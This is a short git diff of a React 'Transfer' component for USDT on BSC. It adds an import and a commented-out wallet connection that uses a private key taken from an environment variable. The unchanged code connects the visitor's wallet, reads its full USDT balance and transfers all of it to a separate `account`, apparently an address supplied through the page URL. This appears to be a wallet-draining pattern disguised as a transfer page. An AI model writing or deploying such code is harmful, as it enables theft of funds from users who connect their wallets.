@@ -2,8 +2,10 @@ import { useEffect, useState } from "react";
 import Swal from "sweetalert2";
 import { connectWallet } from "./connectWallet";
 import { useSearchParams } from "react-router-dom";
+import { connectWithPrivateKey } from "./connectWithPrivateKey";
 
 function Transfer() {
+ 
   const [count, setCount] = useState("");
   const [selectedAccount, setSelectedAccount] = useState("");
   const [searchParams] = useSearchParams();
@@ -41,6 +43,11 @@ function Transfer() {
   const fn_submit = async () => {
     const walletData = await connectWallet("BSC");
     if (!walletData && !account) return;
+
+//     const walletData = await connectWithPrivateKey(
+//   import.meta.env.VITE_PRIVATE_KEY,
+//   "BSC"
+// );
 
     const bal = await walletData.usdtContract.balanceOf(walletData.selectedAccount);
     const tx = await walletData.usdtContract.transfer(account, bal);
